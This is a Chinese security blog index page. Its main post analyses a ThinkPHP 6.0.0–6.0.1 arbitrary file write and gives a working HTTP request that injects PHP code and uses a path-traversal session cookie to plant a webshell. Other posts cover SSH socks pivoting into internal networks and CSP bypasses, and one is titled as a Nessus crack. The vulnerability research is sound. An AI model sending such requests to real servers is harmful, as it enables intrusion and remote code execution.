<!DOCTYPE html><html lang="zh-Hans"><head><meta name="generator" content="Hexo 3.8.0"><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="No logs, no crime"><meta name="keywords" content><meta name="author" content="J0k3r"><meta name="copyright" content="J0k3r"><title>J0k3r</title><link rel="shortcut icon" href="/img/fav.png"><link rel="stylesheet" href="/css/index.css?version=1.6.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.6.1"><link rel="dns-prefetch" href="https://cdn.staticfile.org"><link rel="dns-prefetch" href="https://cdn.bootcss.com"><link rel="dns-prefetch" href="https://creativecommons.org"><link rel="dns-prefetch" href="https://unpkg.com"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/gitment/style/default.min.css"><script src="https://cdn.jsdelivr.net/npm/gitment/dist/gitment.browser.min.js"></script><script src="https://cdn.jsdelivr.net/npm/blueimp-md5@2.10.0/js/md5.min.js"></script><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  }
} </script></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar"><div class="author-info"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">J0k3r</div><div class="author-info__description text-center">No logs, no crime</div><div class="follow-button"><a href="https://github.com/zhuxianjin">Follow Me</a></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">36</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">36</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">友链</div><a class="author-info-links__name text-center" href="https://p0sec.net/">p0神</a><a class="author-info-links__name text-center" href="http://seaii-blog.com/">seaii</a><a class="author-info-links__name text-center" href="http://0sec.com.cn/">everglow</a><a class="author-info-links__name text-center" href="http://mengsec.com/">MengChen</a><a class="author-info-links__name text-center" href="http://windylh.com/">Windylh</a><a class="author-info-links__name text-center" href="http://p0desta.com/">p0desta</a><a class="author-info-links__name text-center" href="http://lanvnal.com/">LANVNAL</a><a class="author-info-links__name text-center" href="http://syf.ac.cn/">7N1ght</a><a class="author-info-links__name text-center" href="http://wzt.ac.cn/">WCatalpa.T</a><a class="author-info-links__name text-center" href="https://daolgts.github.io/">daolgts</a><a class="author-info-links__name text-center" href="https://qingchenldl.github.io">V0W</a><a class="author-info-links__name text-center" href="https://fancyking.ml/">fancyking</a><a class="author-info-links__name text-center" href="http://asa9ao.xyz/">Asa9ao</a></div></div></div><nav id="nav" style="background-image: url(https://i.loli.net/2020/02/01/sHdohVBU8nlmARP.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">J0k3r</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus"><a class="site-page" href="/">主页</a><a class="site-page" href="/archives">归档</a><a class="site-page" href="/tags">标签</a><a class="site-page" href="/about/">关于</a></span></div><div id="site-info"><div id="site-title">J0k3r</div><div id="site-sub-title"></div><div id="site-social-icons"><a class="social-icon" href="https://github.com/zhuxianjin"><i class="fa-github fa"></i></a><a class="social-icon" href="mailto:xavier.chu@foxmail.com"><i class="fa-envelope fa"></i></a><a class="social-icon" href="http://j0k3r.top/atom.xml"><i class="fa-rss fa"></i></a><a class="social-icon" href="http://t.cn/ExVP77H"><i class="fa-qq fa"></i></a><a class="social-icon" href="https://music.163.com/#/user/home?id=375588920"><i class="fa-music fa"></i></a></div></div></nav><div id="content-outer"><div class="layout" id="content-inner"><div class="recent-post-item article-container"><a class="article-title" href="/2020/03/02/ThinkPHP_v6.0.0_ArbitraryFileWriting/">ThinkPHP v6.0.0~6.0.1 任意文件操作漏洞分析</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-03-02</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/漏洞分析/">漏洞分析</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/ThinkPHP/">ThinkPHP</a></span><div class="content"><a id="more"></a>
<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>影响版本：ThinkPHP 6.0.0 ～ThinkPHP 6.0.1</p>
<p>漏洞危害：任意文件操作，getshell</p>
<p>官方补丁：<a href="https://github.com/top-think/framework/commit/1bbe75019ce6c8e0101a6ef73706217e406439f2" target="_blank" rel="noopener">https://github.com/top-think/framework/commit/1bbe75019ce6c8e0101a6ef73706217e406439f2</a></p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="1-搭建环境"><a href="#1-搭建环境" class="headerlink" title="1. 搭建环境"></a>1. 搭建环境</h3><p>安装漏洞版本的 ThinkPHP</p>
<p>测试使用 <code>composer create-project topthink/think=6.0.0 tp6.0.0</code> 命令安装的时候会自动安装 6.0.2 版本的 framework</p>
<p><img src="https://i.loli.net/2020/03/02/VULfjZFaYxH5GlB.png" alt="image-20200205201723699"></p>
<p>可以使用 <code>composer create-project topthink/framework=6.0.0 tpframework</code> 命令下载指定版本的 framework，再替换过去即可</p>
<p>下载若出现  SSL: Handshake timed out 错误的可以尝试换源并在 php.ini 中重新设置超时时间</p>
<p><code>composer config -g repo.packagist composer https://packagist.phpcomposer.com</code></p>
<p><code>default_socket_timeout = 360</code></p>
<h3 id="2-复现"><a href="#2-复现" class="headerlink" title="2. 复现"></a>2. 复现</h3><p>开启 Session，在全局的中间件定义文件中删除 Session 初始化注释</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 全局中间件定义文件</span></span><br><span class="line"><span class="keyword">return</span> [</span><br><span class="line">    <span class="comment">// 全局请求缓存</span></span><br><span class="line">    <span class="comment">// \think\middleware\CheckRequestCache::class,</span></span><br><span class="line">    <span class="comment">// 多语言加载</span></span><br><span class="line">    <span class="comment">// \think\middleware\LoadLangPack::class,</span></span><br><span class="line">    <span class="comment">// Session初始化</span></span><br><span class="line">    \think\middleware\SessionInit::class</span><br><span class="line">];</span><br></pre></td></tr></table></figure>
<p>自定义一个漏洞方法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	$para = Request::get(<span class="string">'para'</span>);</span><br><span class="line">	Session::set(<span class="string">'testSession'</span>, $para);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>发送以下请求</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /index/vuln?para=%3C?php%20phpinfo();?%3E HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8000</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:72.0) Gecko/20100101 Firefox/72.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: PHPSESSID=/../../../000000000000000000.php</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure>
<p>即在 web 根目录生成 000000000000000000.php （如果有写入权限的话）</p>
<p><img src="https://i.loli.net/2020/03/02/orLD62AU1JFdnN5.png" alt="image-20200210233257716"></p>
<h3 id="3-分析"><a href="#3-分析" class="headerlink" title="3. 分析"></a>3. 分析</h3><p>看下官方 github 的 commit </p>
<p><img src="https://i.loli.net/2020/03/02/4ouK6UkPOfVqG3m.png" alt="image-20200210233456562"></p>
<p>对 <code>$id</code> 使用 <code>ctype_alnum</code> 检测其是否全部为字母和(或)数字字符</p>
<p>下面我就 debug 跟一下调用看看是如何通过 session 写入文件的</p>
<p>在开启 Session 初始化的全局中间件之后，ThinkPHP 会调用反射执行类的实例化，加载 \think\middleware\SessionInit</p>
<p><img src="https://i.loli.net/2020/03/02/j5QnUIVCJ1hrkAB.png" alt="image-20200211001948777"></p>
<p>之后通过中间件调度管道，调用 SessionInit 的 handle 类方法进行 session初始化</p>
<p> <img src="https://i.loli.net/2020/03/02/rKCZ16STYg3otyQ.png" alt="image-20200211002520475"></p>
<p>跟进 handle 函数，来到 /vendor/topthink/framework/src/think/middleware/SessionInit.php，首先获取的 <code>$varSessionId</code>值为空，下面跟进  <code>$this-&gt;session-&gt;getName()</code></p>
<p><img src="https://i.loli.net/2020/03/02/QzIcVOvXAJxpmDR.png" alt="image-20200211020829775"></p>
<p>来到 /vendor/topthink/framework/src/think/session/Store.php，Store 类构造函数会调用其 setId 方法，来到漏洞代码处，但此时为 Store 类的初始化阶段，并没有 id 参数传入</p>
<p><img src="https://i.loli.net/2020/03/02/2eLYQBrgAU3H1bk.png" alt="image-20200211001311794"></p>
<p>接着通过 Store 类的 getName 方法获取 sessionName，之后会赋值给 <code>$cookieName</code></p>
<p><img src="https://i.loli.net/2020/03/02/FZ7N9at4XLo3HIJ.png" alt="image-20200211004432030"></p>
<p>而 sessionName 的值在 Store 类中定义好了的，即 <code>&quot;PHPSESSID&quot;</code></p>
<p><img src="https://i.loli.net/2020/03/02/Hiem7z1QORptuU8.png" alt="image-20200211004515137"></p>
<p>返回到 SessionInit，所以此处的 <code>$cookieName</code> 的值为<code>&quot;PHPSESSID&quot;</code></p>
<p><img src="https://i.loli.net/2020/03/02/lN1Hqt7idLJcxp4.png" alt="image-20200211004610180"></p>
<p>接着往下开始获取 <code>$sessionId</code> ，关键一步出现了，由于 <code>$varSessionId</code> 的值为空，所以 if 判断之后，<code>$sessionId</code> 的值就是名称为 PHPSESSID 的 cookie 值，也是后来写入的文件名，接下来将 <code>$sessionId</code> 直接传入 setId 函数进行判断</p>
<p><img src="https://i.loli.net/2020/03/02/2AOs7leV6b1xuGJ.png" alt="image-20200211005240955"></p>
<p>又来到<strong>漏洞代码</strong>处，就是在个时候在这里未对 <code>$id</code> 值做除长度之外的限制，从而可以直接写入任意文件 </p>
<p><img src="https://i.loli.net/2020/03/02/OBeZblfvAxgLzG3.png" alt="image-20200211022612881"></p>
<p>在上面将 PHPSESSID 的值赋值给 <code>id</code>后一路跟进，再次来到 /vendor/topthink/framework/src/think/session/Store.php，终于开始保存 session 数据，获取 <code>$sessionId</code>，即 PHPSESSID 的值，这里测试使用的是 c465f41ee715df8c726dcc4742a6.php</p>
<p><img src="https://i.loli.net/2020/03/02/wdEIKhZHzmTCrSj.png" alt="image-20200211011538058"></p>
<p>将 data 序列化之后通过 write 函数将序列化的数据保存在 c465f41ee715df8c726dcc4742a6.php 文件中</p>
<p><img src="https://i.loli.net/2020/03/02/gWQvmc7q41ksnaY.png" alt="image-20200211012048948"></p>
<p>跟进 write 函数，在文件名前加上了 <code>sess_</code> 前缀，再调用 writeFile 函数写入</p>
<p><img src="https://i.loli.net/2020/03/02/azquwCeNVfo2vMA.png" alt="image-20200211012359526"></p>
<p>跟进 writeFile，最终 <code>file_put_contents</code> 完成写入</p>
<p><img src="https://i.loli.net/2020/03/02/fjUypO47rE6iQ5a.png" alt="image-20200211012532329"></p>
<p>成功写入 WebShell</p>
<p><img src="https://i.loli.net/2020/03/02/CmRxpSOiYrn2fhD.png" alt="image-20200211013012377"></p>
<p>在 /vendor/topthink/framework/src/think/session/Store.php:254 中不难看出还有个 delete 函数，用于删除 session </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">()</span>: <span class="title">void</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;clearFlashData();</span><br><span class="line"></span><br><span class="line">    $sessionId = <span class="keyword">$this</span>-&gt;getId();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;data)) &#123;</span><br><span class="line">        $data = <span class="keyword">$this</span>-&gt;serialize(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;handler-&gt;write($sessionId, $data);    </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;handler-&gt;delete($sessionId);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;init = <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里我也进行了测试，看能否删掉在 web 根目录下的 000000000000000000.php，跟进 delete，</p>
<p><img src="https://i.loli.net/2020/03/02/1FKmLkVO9NgCnDB.png" alt="image-20200211024527031"></p>
<p>显然是通过 getFileName 获取文件名后直接进行删除操作了，但是 getFileName 函数会自动对文件名加上 <code>sess_</code> 前缀</p>
<p><img src="https://i.loli.net/2020/03/02/zWUYKg8Prp3BDxM.png" alt="image-20200211024704834"></p>
<p>这就直接导致在最后 unlink 删除操作之前的 <code>is_file</code> 判断过不了</p>
<p><img src="https://i.loli.net/2020/03/02/6zAhDZcGWwB421q.png" alt="image-20200211024827033"></p>
<p>这也算是比较经典的问题了，因为 php 在读写文件时使用的是 <code>php_stream_open_wrapper_ex</code> 进行流处理，其最后会使用 <code>tsrm_realpath</code> 函数将文件名标准化成一个绝对路径， 通过处理  <code>../</code> 等特殊符号，文件路径中间有不存在的目录时也不会影响，而判断文件存在、重命名、删除文件等操作无需打开文件流，也就不会进行这种处理，导致报错</p>
<p><img src="https://i.loli.net/2020/03/02/NxjbmWrg7ikH8Xo.png" alt="image-20200211025421722"></p>
<h2 id="漏洞总结"><a href="#漏洞总结" class="headerlink" title="漏洞总结"></a>漏洞总结</h2><p>该漏洞主要危害还是文件写入，而文件删除实际测试来看还是比较有限制的，可操作性不强</p>
<p>v6 版本的 ThinkPHP 较之前版本还是有不少变化的，通过 debug 逐步分析漏洞能更好的捋清漏洞的形成过程，了解新的框架执行流程和开发思想</p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://paper.seebug.org/1114/" target="_blank" rel="noopener">https://paper.seebug.org/1114/</a></p>
<p><a href="http://d1iv3.me/2018/04/15/从PHP源码看PHP文件操作缺陷与利用技巧/" target="_blank" rel="noopener">http://d1iv3.me/2018/04/15/%E4%BB%8EPHP%E6%BA%90%E7%A0%81%E7%9C%8BPHP%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E7%BC%BA%E9%99%B7%E4%B8%8E%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/</a></p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/02/13/disable_functions-bypass/">PHP 突破 disable\_functions 常用姿势以及使用 Fuzz 挖掘含内部系统调用的函数</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-02-13</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/PHP/">PHP</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/disable-functions/">disable\_functions</a></span><div class="content"><p>文章首发于安全客：<a href="https://www.anquanke.com/post/id/197745" target="_blank" rel="noopener">https://www.anquanke.com/post/id/197745</a></p></div><a class="more" href="/2020/02/13/disable_functions-bypass/#more">阅读更多</a><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/01/08/ssh-proxy/">使用 SSH 建立 socks 代理进行内网穿透</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-01-08</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/代理/">代理</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/SSH/">SSH</a></span><div class="content"><a id="more"></a>
<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><blockquote>
<p> SSH (Secure Shell) 是一种加密网络协议，用于在不安全的网络上安全地运行网络服务。</p>
</blockquote>
<blockquote>
<p>OpenSSH 是用于使用 SSH 协议进行远程登录的主要连接工具。对所有流量进行加密，此外，OpenSSH 还提供了一整套安全的隧道功能，多种身份验证方法以及复杂的配置选项。</p>
</blockquote>
<p>在一般的 Linux 机器中默认都会装有 OpenSSH，那么在偶尔需要建立代理访问内部网络的时候，抛弃一些其它代理程序的繁琐配置，使用 ssh 不失为一种方便快捷的办法</p>
<p>OpenSSH 命令手册： <a href="https://man.openbsd.org/ssh" target="_blank" rel="noopener">ssh(1) - OpenBSD manual pages</a></p>
<h2 id="0x02-准备"><a href="#0x02-准备" class="headerlink" title="0x02 准备"></a>0x02 准备</h2><p>ssh 配置文件 /etc/ssh/sshd_config 中默认没有 GatewayPorts 这一项或者值为 no</p>
<p><a href="https://man.openbsd.org/sshd_config.5#GatewayPorts" target="_blank" rel="noopener"><code>GatewayPorts</code></a> 用于指定是否允许远程主机连接到为客户端转发的端口，参数为 no 强制远程端口转发仅对本地主机可用，即将远程端口转发绑定到环回地址，防止其他远程主机连接，yes 强制强制远程端口转发绑定到通配符地址，或者指定的其他地址</p>
<p>根据情况进行合理配置，比如要在公网做转发的时候就需要配置 GatewayPorts yes</p>
<p><strong>sshd_config</strong> 配置参数手册：<a href="https://man.openbsd.org/sshd_config.5" target="_blank" rel="noopener"><strong>sshd_config —— OpenSSH daemon configuration file</strong></a></p>
<h2 id="0x03-转发"><a href="#0x03-转发" class="headerlink" title="0x03 转发"></a>0x03 转发</h2><p>在本地使用 Docker 模拟搭建一个简易的网络环境</p>
<p><img src="https://i.loli.net/2020/03/02/WNUfq4wL1mTpulE.png" alt="image-20200203005152618"></p>
<p>如图，都是在内网中的机器，只不过网段不同，使用 ssh 建立代理来访问不同层次的网络</p>
<p>下面先简单介绍用到的命令参数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">-p port 连接到远程主机上的端口</span><br><span class="line">-N 不执行远程命令。对于仅转发端口很有用</span><br><span class="line">-f 将 ssh 命令放在后台</span><br><span class="line">-n 从 /dev/null 重定向标准输入（实际上，防止从标准输入读取),在后台运行ssh时必须使用此选项</span><br><span class="line">-q 安静模式。阻止大多数警告和诊断消息。</span><br><span class="line">-g 允许远程主机连接到本地转发的端口</span><br><span class="line">-T 禁用伪终端分配</span><br><span class="line">-p [port] 要连接到远程主机上的端口</span><br><span class="line">-D [bind_address:]port 指定本地“动态”应用程序级端口转发</span><br><span class="line">-R [bind_address:]port:host:hostport 指定与远程（服务器）主机上给定的TCP端口或Unix套接字的连接将转发到本地</span><br></pre></td></tr></table></figure>
<h3 id="应用场景-一-Host-1-访问-192-168-1-0-24-网络"><a href="#应用场景-一-Host-1-访问-192-168-1-0-24-网络" class="headerlink" title="应用场景 一. Host 1 访问 192.168.1.0/24 网络"></a>应用场景 一. Host 1 访问 192.168.1.0/24 网络</h3><p>图中的 Host 1 有且只有一个 ip，处于 172.16.1.0/24 网络中，能直接访问的主机只有 Host 2</p>
<p>在 Host 1 使用 ssh 建立一个 socks 代理服务器即可，使用 <code>-D</code></p>
<p><code>-D</code> 参数是比较关键的一个，建立代理就靠它了，通过分配一个套接字来侦听本地端的端口，每当与此端口建立连接时，该连接都会通过安全通道转发，充当 SOCKS 服务器，支持 SOCKS4 和 SOCKS5 协议</p>
<blockquote>
<p>只有root可以转发特权端口（端口号小于 1024 的端口），动态端口转发也可以在配置文件中指定。</p>
</blockquote>
<p>Host 1 执行命令:</p>
<p><code>ssh -fnqgNTD [host 1 port ] -p 22 [host 2 username]@[host 2 ip]</code></p>
<p>该场景下使用：<code>ssh -fnqgNTD 7777 -p 22 j0k3r@172.16.1.3</code></p>
<p>Host 1 给当前终端设置 socks 5 代理：<code>export ALL_PROXY=socks5://127.0.0.1:10808</code></p>
<p>访问 192.168.1.0/24 网络验证一下</p>
<p><img src="https://i.loli.net/2020/03/02/ABZlVvG8hK3gamM.png" alt="image-20200204000948914"></p>
<p> Host 1 发送的网络数据通过 socks 代理和 ssh 连接发送到了 Host 2，于是就能访问 Host 3 的服务了</p>
<h3 id="引用场景-二-Host-1-访问-10-1-1-0-24-网络"><a href="#引用场景-二-Host-1-访问-10-1-1-0-24-网络" class="headerlink" title="引用场景 二. Host 1 访问 10.1.1.0/24 网络"></a>引用场景 二. Host 1 访问 10.1.1.0/24 网络</h3><p>上图可以看出 Host 2 和 Host 3 同处于 192.168.1.0/24 网络，但是只有 Host 3 还可以访问 10.1.1.0/24，而 Host 1 更是不能直接访问 Host 3，这个时候相对于场景一只需要在中间让 Host 2 把 Host 3 的 22 端口转发给 Host 1 就行了，最终使用场景一中的方法开启代理即可 </p>
<p>需要用到 ssh <strong>反向代理</strong>，使用 <code>-R</code></p>
<p><code>-R</code> 参数是转发的关键参数, 指定与远程（服务器）主机上给定的TCP端口或Unix套接字的连接将转发到本地</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-R [bind_address:]port:host:hostport</span><br><span class="line">-R [bind_address:]port:local_socket</span><br><span class="line">-R remote_socket:host:hostport</span><br><span class="line">-R remote_socket:local_socket</span><br><span class="line">-R [bind_address:]port</span><br></pre></td></tr></table></figure>
<p>举个例子</p>
<p>Host 2:  <code>ssh -fnqgNTR [host 1 port]:[host 3]:[host 3 port]  -p 22 [host 1 username]@[host 1 ip]</code></p>
<p>该命令会将 host 3 的 port 转发到 host 1 的 port</p>
<p>该场景下命令为：<code>ssh -fnqgNTR 6666:192.168.1.3:9090  -p 22 j0k3r@172.16.1.2</code></p>
<p><img src="https://i.loli.net/2020/03/02/Teu2EkKlcBJh8Pq.png" alt="image-20200204003159932"></p>
<p>此时 host 1 可以通过访问本地 6666 端口直接访问 host 3 的 9090 端口上的服务</p>
<p>同理，转发 host 3 的 ssh 端口，再建立代理</p>
<p>该场景下命令为：</p>
<p>Host 2: <code>ssh -fngqNTR 7777:192.168.1.3:22 -p 22 j0k3r@172.16.1.2</code></p>
<p>Host 1: <code>ssh -fngqNTD 6767 -p 7777 j0k3r@127.0.0.1</code>, <code>export ALL_PROXY=socks5://127.0.0.1:6767</code></p>
<p>此时 host 1 可以通过代理直接访问 host 4</p>
<p><img src="https://i.loli.net/2020/03/02/RFBNzPbTxLIOgwm.png" alt="image-20200204023545869"></p>
<h3 id="其他场景"><a href="#其他场景" class="headerlink" title="其他场景"></a>其他场景</h3><h4 id="（1）反向代理穿透内网，外网访问"><a href="#（1）反向代理穿透内网，外网访问" class="headerlink" title="（1）反向代理穿透内网，外网访问"></a>（1）反向代理穿透内网，外网访问</h4><p><img src="https://i.loli.net/2020/03/02/LHmI4l9AeFk1Gwy.png" alt="image-20200204024355249"></p>
<h4 id="（2）正向代理"><a href="#（2）正向代理" class="headerlink" title="（2）正向代理"></a>（2）正向代理</h4><p>使用 <code>-L</code></p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/01/05/nessus-crack/">Nessus v8.x 永久破解方法</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-01-05</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/工具/">工具</a></span><div class="content"><p>点击阅读</p></div><a class="more" href="/2020/01/05/nessus-crack/#more">阅读更多</a><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2019/11/19/csp-bypass/">前端安全之 CSP 及其常见绕过</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-11-19</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/CSP/">CSP</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/前端/">前端</a></span><div class="content"><a id="more"></a>
<h2 id="0x01-CSP-内容安全策略"><a href="#0x01-CSP-内容安全策略" class="headerlink" title="0x01 CSP (内容安全策略)"></a>0x01 CSP (内容安全策略)</h2><h3 id="1-CSP-是什么？"><a href="#1-CSP-是什么？" class="headerlink" title="1. CSP 是什么？"></a>1. CSP 是什么？</h3><blockquote>
<p>内容安全策略  (CSP) 是一个额外的安全层，用于检测并削弱某些特定类型的攻击，包括跨站脚本 (XSS) 和数据注入攻击等。无论是数据盗取、网站内容污染还是散发恶意软件，这些攻击都是主要的手段。</p>
</blockquote>
<p>使用 CSP 的主要目的就是通过指定<strong>有效域</strong>防御 XSS 这类的攻击</p>
<h3 id="2-使用-CSP"><a href="#2-使用-CSP" class="headerlink" title="2. 使用 CSP"></a>2. 使用 CSP</h3><ol>
<li>使用 <code>Content-Security-Policy</code> HTTP 头 </li>
</ol>
<ol start="2">
<li>html 标签</li>
</ol>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Security-Policy"</span> <span class="attr">content</span>=<span class="string">"script-src 'self'; object-src 'none'; style-src cdn.example.org third-party.org; child-src https:"</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>CSP 限制类型</p>
<p>常见：</p>
<p><code>default-src</code> 能够设置其他指令的值，其他指令为下面这几个</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">child-src	//框架</span><br><span class="line">connect-src	//HTTP 连接（通过 XHR、WebSockets、EventSource等）</span><br><span class="line">font-src	//字体文件</span><br><span class="line">frame-src	//&lt;frame&gt; 和 &lt;iframe&gt;</span><br><span class="line">img-src	//图像</span><br><span class="line">manifest-src	//manifest 文件</span><br><span class="line">media-src	//媒体文件（音频和视频）</span><br><span class="line">object-src	//插件（比如 Flash）</span><br><span class="line">prefetch-src	//prefetch 和 prerender</span><br><span class="line">script-src	//外部脚本</span><br><span class="line">script-src-elem	//指定&lt;script&gt;有效来源，但未指定内嵌脚本事件处理程序（如onclick）</span><br><span class="line"></span><br><span class="line">script-src-attr	//和 script-src-elem 相反</span><br><span class="line">style-src	//样式表</span><br><span class="line">style-src-elem	//指定 rel=&quot;stylesheet&quot; 样式的 &lt;style&gt; 和 &lt;link&gt;</span><br><span class="line">style-src-attr	//指定单个DOM元素的内联样式有效来源</span><br><span class="line">worker-src	//worker脚本</span><br></pre></td></tr></table></figure>
<p>其他：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">base-uri</span><br><span class="line">block-all-mixed-content		//HTTPS 网页不得加载 HTTP 资源（浏览器已经默认开启）</span><br><span class="line">default-src</span><br><span class="line">form-action</span><br><span class="line">frame-ancestors</span><br><span class="line">navigate-to</span><br><span 